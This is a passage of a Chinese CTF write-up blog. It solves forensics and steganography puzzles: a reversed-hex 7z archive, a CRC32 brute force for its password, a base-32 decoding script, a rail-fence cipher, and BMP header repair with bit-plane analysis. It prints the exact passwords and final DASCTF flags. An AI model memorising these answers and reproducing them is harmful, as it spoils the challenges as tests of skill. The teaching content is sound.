然后上传了一个flag文件，熟悉文件头的话很容易发现这是一个十六进制逆序后的7z文件

![](imgs/image-20250917205935758.png)

直接CyberChef中逆序一下提取出来即可

![](imgs/image-20250917210145240.png)

然后继续看，发现用户还传了三个文件，分别是：pwd1.dat pwd2.dat pwd3.dat

![](imgs/image-20250917210243642.png)

![](imgs/image-20250917210255450.png)

![](imgs/image-20250917210305243.png)

出题人这里出的不好，因为传的每个dat文件也都是4字节的，很容易让选手认为这几个就是crc32的值

但是其实我们要爆破的是这三个数据crc32计算后的值

我们可以复制出原始的十六进制，然后用CyberChef转一下

![](imgs/image-20250917210453035.png)

![](imgs/image-20250917210506257.png)

![](imgs/image-20250917210525392.png)

然后拿crc32爆破的脚本爆破一下crc32即可得到解压密码：`PAS4_Wo3d_he3e!`

![](imgs/image-20250917211011825.png)

用上面的密码解压7z后可以得到一个 flag.txt 内容如下：

&gt; D 1l A 1h S 1g 23 1d 2k 32 26 1n 3r 1k 1i 1k 1l 1d 33 1l 31 1p 34 1k 1p 1i 31 35 1m 32 1d 1m 1m 35 32 1m 1k 33 31 1n 1d 1m 1k 3t

发现有DAS这三个关键的字母，然后别的数据应该都是32进制，因此我们写个脚本转换一下

```python
def func():
    with open(&#34;flag.txt&#34;,&#39;r&#39;) as f:
        data = f.read().split()

    flag = &#34;&#34;
    for item in data:
        if item.isupper():
            flag &#43;= item
        else:
            flag &#43;= chr(int(item,32))
            
    print(flag) 
    # D5A1S0C-TbF7{4245-c5a9d492ae6b-66eb64ca7-64}

if __name__ == &#34;__main__&#34;:
    func()
```

最后解个栅栏密码即可得到最后的flag：`DASCTF{25cad9a6-6b4a-4510-b744-5942eb6e6c76}`

![](imgs/image-20250917211345026.png)

## 题目名称 the&#43;year&#43;we&#43;were&#43;16（2025黑龙江省赛）

题目附件给了一张文本头部数据被篡改后的 BMP 图片，010 打开提示报错

![](imgs/image-20250922225747582.png)

当我们把模板中的这两个参数修正后，虽然 010 还提示报错，但是BMP 图片已经能正常显示了

![](imgs/image-20250922225844125.png)

然后我们拿 stegsolve 打开，一个 Plane 一个 Plane 地查看，发现以下几个平面存在隐写的信息

![](imgs/image-20250922230025465.png)

![](imgs/image-20250922230125118.png)

![](imgs/image-20250922230140137.png)

因此我们把这几个平面上对应的信息提取出来，即可得到最后的 flag：`DASCTF{RGB_five_six_five_takes_you_back_to_old_live}`

![](imgs/image-20250922230235662.png)




---

> Author: [Lunatic](https://goodlunatic.github.io)  
> URL: https://goodlunatic.github.io/posts/bb1da35/  

